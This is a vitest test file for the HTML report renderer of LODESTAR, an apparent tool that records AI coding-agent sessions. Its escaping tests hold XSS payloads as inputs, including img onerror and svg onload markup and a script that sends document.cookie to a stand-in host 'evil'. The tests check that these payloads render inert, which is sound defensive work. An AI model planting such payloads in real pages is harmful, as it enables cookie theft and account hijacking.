/**
 * The HTML renderer — D-054.
 *
 * ---------------------------------------------------------------------------
 * TWO THINGS THESE TESTS DEFEND
 * ---------------------------------------------------------------------------
 *
 * 1. **The renderer has no opinions.** Every judgment word on the page comes from the
 *    model. The terminal, the browser, and the export must agree, and the only way they
 *    can disagree is if one of them starts deciding things — so the tests assert that the
 *    page says what the model said, not what looks nice.
 *
 * 2. **Escaping, everywhere, always.** Reality Facts contain filenames and command
 *    strings the AGENT chose. The export is designed to be shared (D-014). An unescaped
 *    report is therefore a stored XSS, delivered by a trust tool, to a teammate who opened
 *    the file *because* they trusted it. The stress suite already proves LODESTAR records
 *    hostile filenames byte-identically — which means it hands them straight to this file.
 */

import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { randomUUID } from 'node:crypto'
import { openDatabase } from '../storage/db.js'
import { SqliteEventStore } from '../storage/event-store.js'
import { buildIndex, buildReport, type DiffView, type FileChange, type SessionReport } from '../facts/report.js'
import { renderHtml, esc } from './html.js'
import type { EventKind, EventTarget, SignalTier } from '../types/events.js'

let dir: string
let db: ReturnType<typeof openDatabase>
let store: SqliteEventStore
let sessionId: string
let clock = 0

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'lodestar-html-'))
  db = openDatabase(join(dir, 'db.sqlite'))
  store = new SqliteEventStore(db)
  sessionId = store.createSession({ runtimeId: 'claude-code', cwd: dir, mission: null }).id
  clock = 0
})

afterEach(() => {
  db.close()
  rmSync(dir, { recursive: true, force: true })
})

function append(kind: EventKind, payload: unknown, target?: EventTarget, tier: SignalTier = 'groundTruth', snapshotRef?: { before?: string; after?: string }): string {
  const id = randomUUID()
  store.append({
    id,
    sessionId,
    ts: new Date(Date.UTC(2026, 0, 1, 0, 0, clock++)).toISOString(),
    monotonicTs: clock * 1000,
    source: 'process',
    signalTier: tier,
    kind,
    actor: { kind: 'agent', runtimeId: 'claude-code' },
    payload,
    ...(target ? { target } : {}),
    ...(snapshotRef ? { snapshotRef } : {}),
  })
  return id
}

function wellFormed(): void {
  append('session.start', { runtimeId: 'claude-code', cwd: dir, argv: [] })
  append('agent.output', {
    coverageProbe: { shell: 'bash -lc', shimDir: '/shims', commands: [{ command: 'npm', status: 'observed', resolvedTo: '/shims/npm' }] },
  })
}
const endSession = () => append('session.end', { exitCode: 0, durationMs: 1 })

function render(r: SessionReport, diff?: (c: FileChange) => DiffView): string {
  return renderHtml(r, {
    mode: 'export',
    index: buildIndex(store),
    generatedAt: '2026-01-01T00:00:00.000Z',
    ...(diff ? { diff } : {}),
  })
}

const report = () => buildReport(store, sessionId)!

// ===========================================================================
// Escaping — the security boundary.
// ===========================================================================

describe('escaping', () => {
  it('escapes the five characters that turn text into markup', () => {
    expect(esc(`<script>"&'`)).toBe('&lt;script&gt;&quot;&amp;&#39;')
  })

  /**
   * The attack, end to end.
   *
   * `<img src=x onerror=alert(1)>.ts` is a legal filename on Linux and macOS. An agent
   * can create it; the fs recorder will faithfully record it; RF-07 will put it in a
   * statement; and the export gets emailed to a teammate.
   */
  it('cannot be made to execute script through a hostile FILENAME', () => {
    wellFormed()
    const evil = `/tmp/<img src=x onerror=alert(1)>.ts`
    append('file.write', { path: evil, mtimeMs: 1 }, { raw: evil, resolved: evil, kind: 'file', inScope: false })
    endSession()

    const html = render(report())

    // The fact fired and the path is visible to the reader...
    expect(html).toContain('&lt;img src=x onerror=alert(1)&gt;')
    // ...but no executable tag was produced anywhere on the page.
    //
    // Note what is NOT asserted: that the string "onerror=alert" is absent. It is present,
    // as escaped text, and it must be — the user needs to see the real filename, hostile
    // or not. Escaping is what makes it inert; deleting it would be LODESTAR editing
    // reality to look tidy, which is the opposite of the product.
    expect(html).not.toContain('<img src=x')
  })

  it('cannot be made to execute script through a hostile COMMAND', () => {
    wellFormed()
    const evil = `node -e "</script><script>fetch('http://evil/'+document.cookie)</script>"`
    append('process.exit', { command: evil, exitCode: 1, durationMs: 1 }, { raw: evil, resolved: evil, kind: 'process', inScope: true })
    endSession()

    const html = render(report())
    expect(html).toContain('&lt;/script&gt;')
    expect(html).not.toContain("<script>fetch('http://evil/")
  })

  it('cannot be made to execute script through a hostile MISSION', () => {
    // The mission is human-typed and lands in the session row, which the header renders.
    const s = store.createSession({ runtimeId: 'x', cwd: dir, mission: '<svg onload=alert(1)>' })
    append('session.start', { runtimeId: 'x', cwd: dir, argv: [] })
    const r = buildReport(store, s.id)!
    const html = renderHtml(r, { mode: 'export', index: [], generatedAt: '2026-01-01T00:00:00.000Z' })
    expect(html).not.toContain('<svg onload')
  })

  it('cannot be made to execute script through DIFF CONTENT', () => {
    // The most likely one to be forgotten: the diff renders the developer's own source,
    // and source is full of markup.
    wellFormed()
    append('file.write', { path: join(dir, 'index.html'), mtimeMs: 1 }, { raw: 'index.html', resolved: join(dir, 'index.html'), kind: 'file', inScope: true }, 'groundTruth', { before: 'a', after: 'b' })
    endSession()

    const html = render(report(), () => ({
      kind: 'text',
      before: '<div>old</div>',
      after: `<script>alert('xss')</script>`,
    }))

    expect(html).toContain('&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;')
    expect(html).not.toContain("<script>alert('xss')</script>")
  })

  it('cannot be made to execute script through a LIMITATION or a coverage row', () => {
    wellFormed()
    append('agent.output', { recorderError: '<script>alert(1)</script>', recorder: 'filesystem' })
    endSession()
    const html = render(report())
    expect(html).not.toContain('<script>alert(1)</script>')
  })
})

// ===========================================================================
// The renderer must not have opinions.
// ===========================================================================

describe('the renderer renders, it does not decide', () => {
  /**
   * The forgery, in the browser.
   *
   * Same scenario as the terminal's D-053 test: rewrite `exit 1` to `exit 0`, and the fact
   * disappears. A renderer keying off `facts.length` shows a green tick on an altered
   * record — which is why `factsVerdict` exists and why this test exists in all three
   * renderers.
   */
  it('never shows a green all-clear on a BROKEN record', () => {
    wellFormed()
    append('process.exit', { command: 'npm test', exitCode: 1, durationMs: 1 }, { raw: 'npm test', resolved: 'npm test', kind: 'process', inScope: true })
    endSession()

    db.exec('DROP TRIGGER events_no_update')
    db.prepare("UPDATE events SET payload = ? WHERE kind = 'process.exit'").run(JSON.stringify({ command: 'npm test', exitCode: 0, durationMs: 1 }))

    const r = report()
    expect(r.factsVerdict).toBe('record-untrustworthy')

    const html = render(r)
    expect(html).toContain('No facts can be reported from this record')
    expect(html).not.toContain('No divergences observed')
    expect(html).toContain('BROKEN')
  })

  it('renders the two-axis verdict from the model, and never a recommendation (D-058)', () => {
    wellFormed()
    append('process.exit', { command: 'npm test', exitCode: 1, durationMs: 1 }, { raw: 'npm test', resolved: 'npm test', kind: 'process', inScope: true })
    endSession()

    const r = report()
    const html = render(r)
    expect(html).toContain(esc(r.verdict.finding.text)) // "1 divergence observed"
    expect(html).toContain('verdict-block')
    // The dominant answer never crosses into a decision.
    for (const banned of ['Safe to merge', 'safe to merge', 'Approved', 'Looks good']) {
      expect(html).not.toContain(banned)
    }
  })

  it('co-locates RF-04 assumptions on the fact card, not in a floating list (D-058)', () => {
    wellFormed()
    const testTime = Date.UTC(2026, 0, 1, 12, 0, 0)
    append('process.exit', { command: 'npm test', exitCode: 0, durationMs: 1 }, { raw: 'npm test', resolved: 'npm test', kind: 'process', inScope: true })
    append('file.write', { path: join(dir, 'a.ts'), mtimeMs: testTime + 60_000 }, { raw: 'a.ts', resolved: join(dir, 'a.ts'), kind: 'file', inScope: true })
    endSession()

    const r = report()
    const html = render(r)
    const v = r.views.find((x) => x.fact.id === 'RF-04')!
    expect(v.assumptions.length).toBeGreaterThan(0)
    // Every assumption string appears verbatim, under the fact's "why" disclosure.
    for (const a of v.assumptions) expect(html).toContain(esc(a))
    expect(html).toContain('Why LODESTAR believes this')
  })

  it('labels observed facts and inference distinctly (D-058 / incident IA)', () => {
    wellFormed()
    const testTime = Date.UTC(2026, 0, 1, 12, 0, 0)
    append('process.exit', { command: 'npm test', exitCode: 0, durationMs: 1 }, { raw: 'npm test', resolved: 'npm test', kind: 'process', inScope: true })
    append('file.write', { path: join(dir, 'a.ts'), mtimeMs: testTime + 60_000 }, { raw: 'a.ts', resolved: join(dir, 'a.ts'), kind: 'file', inScope: true })
    endSession()

    const html = render(report())
    // Facts and interpretations must never share a visual style — so the groups are
    // labelled in words, not only colour, for a screenshot or a colour-blind reader.
    expect(html).toContain('Observed facts')
    expect(html).toContain('LODESTAR’s reading')
    expect(html).toContain('group observed')
    expect(html).toContain('group consequence')
  })

  it('shows the clean line ONLY with the caveat when limitations exist', () => {
    // An empty report must never imply success — the same rule the terminal holds.
    wellFormed()
    append('file.write', { path: join(dir, 'a.ts'), mtimeMs: 1 }, { raw: 'a.ts', resolved: join(dir, 'a.ts'), kind: 'file', inScope: true })
    endSession()

    const html = render(report())
    expect(html).toContain('No divergences observed')
    expect(html).toContain('Read the limitations below before treating that as all-clear')
    expect(html).toContain('Limitations')
  })

  it('prints every limitation string from the model, verbatim', () => {
    wellFormed()
    append('file.write', { path: join(dir, 'a.ts'), mtimeMs: 1 }, { raw: 'a.ts', resolved: join(dir, 'a.ts'), kind: 'file', inScope: true })
    endSession()

    const r = report()
    const html = render(r)
    // Not "some" and not "the first three". A limitation the renderer drops is a hole the
    // user never learns about.
    for (const note of [...r.limitations, ...r.integrity.degraded]) {
      expect(html).toContain(esc(note))
    }
  })

  /**
   * The headline is the model's, on every surface.
   *
   * When `views` landed, the browser started leading with "Code changed after testing"
   * while the terminal still led with "payments.mjs modified after the last test run".
   * Same session, same model, two different headlines — the D-049 drift, one afternoon
   * after the decision that forbids it. Both renderers now read `views`; this is what
   * stops one of them from wandering off again.
   */
  it('leads with the title from the model, and keeps the id available', () => {
    wellFormed()
    append('process.exit', { command: 'npm test', exitCode: 1, durationMs: 1 }, { raw: 'npm test', resolved: 'npm test', kind: 'process', inScope: true })
    endSession()

    const r = report()
    const html = render(r)

    for (const v of r.views) {
      expect(html).toContain(esc(v.title))
      expect(html).toContain(esc(v.fact.statement))
      expect(html).toContain(esc(v.fact.id)) // in the details, not the headline
      for (const s of v.steps) expect(html).toContain(esc(s.text))
    }
  })

  it('renders the chain in the model’s order', () => {
    wellFormed()
    const testTime = Date.UTC(2026, 0, 1, 12, 0, 0)
    append('process.exit', { command: 'npm test', exitCode: 0, durationMs: 1 }, { raw: 'npm test', resolved: 'npm test', kind: 'process', inScope: true })
    append('file.write', { path: 'a.ts', mtimeMs: testTime + 5000 }, { raw: 'a.ts', resolved: join(dir, 'a.ts'), kind: 'file', inScope: true })
    endSession()

    const r = report()
    const v = r.views.find((x) => x.fact.id === 'RF-04')!
    const html = render(r)

    // The order is the fact. A renderer that sorted differently would tell a different
    // story out of the same evidence.
    const positions = v.steps.map((s) => html.indexOf(esc(s.text)))
    expect(positions.every((p) => p !== -1)).toBe(true)
    expect([...positions].sort((a, b) => a - b)).toEqual(positions)
    expect(html).toContain('No test run was observed after this change.')
  })

  it('prints every fact statement and its evidence from the model, verbatim', () => {
    wellFormed()
    append('process.exit', { command: 'npm test', exitCode: 1, durationMs: 1 }, { raw: 'npm test', resolved: 'npm test', kind: 'process', inScope: true })
    endSession()

    const r = report()
    const html = render(r)
    expect(r.facts.length).toBeGreaterThan(0)
    for (const f of r.facts) {
      expect(html).toContain(esc(f.statement))
      expect(html).toContain(esc(f.id))
      for (const ev of f.evidence) {
        expect(html).toContain(esc(r.evidence[ev.eventId]!.summary))
      }
    }
  })

  it('renders the model status word and no other', () => {
    wellFormed()
    endSession()
    const r = report()
    const html = render(r)
    expect(html).toContain(r.integrity.status)
    // No invented fourth state, no softening of the three.
    for (const forbidden of ['PASSED', 'OK</span>', 'CLEAN', 'SUCCESS', 'FAILED']) {
      expect(html).not.toContain(forbidden)
    }
  })

  /**
   * `mode` is presentation. If it could change a judgment, the shared file and the
   * dashboard would be two different reports — which is the whole failure D-049 names.
   */
  it('renders identical judgments in server and export mode', () => {
    wellFormed()
    append('process.exit', { command: 'npm test', exitCode: 1, durationMs: 1 }, { raw: 'npm test', resolved: 'npm test', kind: 'process', inScope: true })
    endSession()

    const r = report()
    const index = buildIndex(store)
    const server = renderHtml(r, { mode: 'server', index, generatedAt: 'T' })
    const exported = renderHtml(r, { mode: 'export', index, generatedAt: 'T' })

    for (const f of r.facts) {
      expect(server).toContain(esc(f.statement))
      expect(exported).toContain(esc(f.statement))
    }
    expect(server.includes('BROKEN') ).toBe(exported.includes('BROKEN'))
    expect(server.includes('No divergences observed')).toBe(exported.includes('No divergences observed'))
  })
})

// ===========================================================================
// The six reasons a diff can be missing — all distinct, none silent.
// ===========================================================================

describe('content availability', () => {
  const write = (path: string, payload: Record<string, unknown>, snap?: { before?: string; after?: string }) =>
    append('file.write', { path, mtimeMs: 1, ...payload }, { raw: path, resolved: join(dir, path), kind: 'file', inScope: true }, 'groundTruth', snap)

  it('states WHY a withheld file has no diff, rather than showing an empty pane', () => {
    wellFormed()
    write('.env', { contentWithheld: 'sensitive' })
    endSession()

    const r = report()
    expect(r.changes[0]!.content).toBe('withheld')
    const html = render(r, (c) => ({ kind: 'unavailable', reason: c.contentNote! }))
    expect(html).toContain('credential-shaped')
    expect(html).toContain('never read')
  })

  it('distinguishes oversized from withheld from binary', () => {
    wellFormed()
    write('big.sql', { contentWithheld: 'oversized' })
    write('logo.png', { binary: true }, { after: 'x' })
    write('.env', { contentWithheld: 'sensitive' })
    endSession()

    const r = report()
    const states = Object.fromEntries(r.changes.map((c) => [c.name, c.content]))
    expect(states['big.sql']).toBe('oversized')
    expect(states['logo.png']).toBe('binary')
    expect(states['.env']).toBe('withheld')

    // Three different sentences. One pane saying nothing would have been three lies.
    const notes = r.changes.map((c) => c.contentNote)
    expect(new Set(notes).size).toBe(3)
  })

  it('says "identical" rather than "unavailable" when content did not change', () => {
    wellFormed()
    write('a.ts', {}, { before: 'h1', after: 'h1' })
    endSession()
    const html = render(report(), () => ({ kind: 'text', before: 'same', after: 'same' }))
    expect(html).toContain('identical between the two snapshots')
  })

  it('shows only the changed line for a single insertion', () => {
    // The naive positional diff rendered a one-line insert as a whole-file rewrite. A
    // trust product whose diff exaggerates is teaching the user to discount it.
    wellFormed()
    write('a.ts', {}, { before: 'h1', after: 'h2' })
    endSession()

    const html = render(report(), () => ({
      kind: 'text',
      before: 'line one\nline three',
      after: 'line one\nline two\nline three',
    }))
    expect((html.match(/class="add"/g) ?? []).length).toBe(1)
    expect(html).not.toContain('class="del"')
  })

  /**
   * Deletions, which the insertion test above cannot see.
   *
   * Found by mutation testing: disabling the LCS's "prefer delete" branch still passed
   * every diff test, because an insertion-only fixture never exercises it. A diff that can
   * only render additions would show a REMOVED line as nothing at all — the most dangerous
   * direction for this product, since deleted code is exactly what a developer is looking
   * for when they open a report.
   */
  it('renders a deleted line as a deletion, not as nothing', () => {
    wellFormed()
    write('a.ts', {}, { before: 'h1', after: 'h2' })
    endSession()

    const html = render(report(), () => ({
      kind: 'text',
      before: 'keep\ndelete me\nkeep two',
      after: 'keep\nkeep two',
    }))
    expect((html.match(/class="del"/g) ?? []).length).toBe(1)
    expect(html).toContain('-delete me')
    expect(html).not.toContain('class="add"')
  })

  it('renders a replacement as one deletion and one addition', () => {
    wellFormed()
    write('a.ts', {}, { before: 'h1', after: 'h2' })
    endSession()

    const html = render(report(), () => ({ kind: 'text', before: 'a\nold\nc', after: 'a\nnew\nc' }))
    expect((html.match(/class="del"/g) ?? []).length).toBe(1)
    expect((html.match(/class="add"/g) ?? []).length).toBe(1)
  })
})

// ===========================================================================
// Git — where unknown is most likely to be rendered as clean.
// ===========================================================================

describe('the git panel', () => {
  it('never renders an unreadable working tree as a clean one', () => {
    // Found by mutation testing. `dirtyAtEnd: undefined` means git gave us no readable
    // answer; `[]` means git said "clean". Rendering both as clean is D-047's bug
    // reappearing in the view layer, where no fact-engine guard can reach it.
    wellFormed()
    append('git.status', { branch: 'main', head: 'abc123' }) // no dirtyAtEnd → unknown
    endSession()

    const r = report()
    expect(r.git.dirtyAtEnd).toBeUndefined()

    const html = render(r)
    expect(html).toContain('could not be read')
    expect(html).toContain('This is not a clean tree')
    expect(html).not.toContain('measured clean')
  })

  it('renders a measured-clean tree as measured, in different words', () => {
    wellFormed()
    append('git.status', { branch: 'main', head: 'abc123', dirtyAtEnd: [] })
    endSession()

    const r = report()
    expect(r.git.dirtyAtEnd).toEqual([])
    const html = render(r)
    expect(html).toContain('measured clean')
    expect(html).not.toContain('could not be read')
  })

  it('says nothing about git when no git event was recorded', () => {
    wellFormed()
    endSession()
    const html = render(report())
    // Not a repo, or git was unreadable. Either way silence is not "nothing happened".
    expect(html).toContain('No git activity was observed')
    expect(html).toContain('not the same as')
  })
})

// ===========================================================================
// Structure: self-contained, and honest about narration.
// ===========================================================================

describe('the page itself', () => {
  it('loads nothing from the network — the export must work offline forever', () => {
    wellFormed()
    endSession()
    const html = render(report())

    // D-014: a teammate who installed nothing opens this file. Any external reference is
    // a dependency on a server that will outlive neither the link nor their trust.
    expect(html).not.toMatch(/src="https?:/)
    expect(html).not.toMatch(/href="https?:/)
    expect(html).not.toMatch(/@import/)
    expect(html).not.toContain('fetch(')
    expect(html).not.toContain('XMLHttpRequest')
  })

  it('labels narration AS narration in the timeline', () => {
    wellFormed()
    append('agent.output', { text: 'All tests pass!' }, undefined, 'narration')
    endSession()

    const html = render(report())
    // The agent's claim rendered beside an observed exit code, unlabelled, is the
    // agent-reporting-on-itself problem sneaking back in through the view layer.
    expect(html).toContain('narration')
    expect(html).toContain('recorded, never reasoned over')
  })

  it('shows the tamper-evident claim and never a stronger one', () => {
    wellFormed()
    endSession()
    const html = render(report()).toLowerCase()

    expect(html).toContain('tamper-evident')
    // "tamper-proof" DOES appear — in "not a tamper-proof one". A bare word-ban fails
    // here, which is the right kind of failure to have found: the page must be able to
    // *deny* the stronger claim, and denying it means naming it. So the assertion is about
    // the claim, not the word.
    expect(html).toContain('not a tamper-proof one')
    expect(html).not.toMatch(/is tamper-proof|provably|cryptographically prov/)
    expect(html).not.toContain('verified ai')
    expect(html).not.toContain('impossible to tamper')
    // The Same-UID ceiling is disclosed, not buried (THREAT-MODEL §1).
    expect(html).toContain('same os user as the agent')
  })

  it('renders a session with no events without inventing anything', () => {
    const r = report()
    const html = render(r)

    // No evidence at all is not a clean session — it is a session we know nothing about.
    expect(r.integrity.status).toBe('DEGRADED')
    expect(html).toContain('DEGRADED')
    expect(html).toContain('No divergences observed')
    // ...and the caveat must be attached to it, or the tick is the only thing read.
    expect(html).toContain('Read the limitations below before treating that as all-clear')
    expect(html).toContain('Limitations')
    expect(html).toContain('No file changes were observed')
  })
})
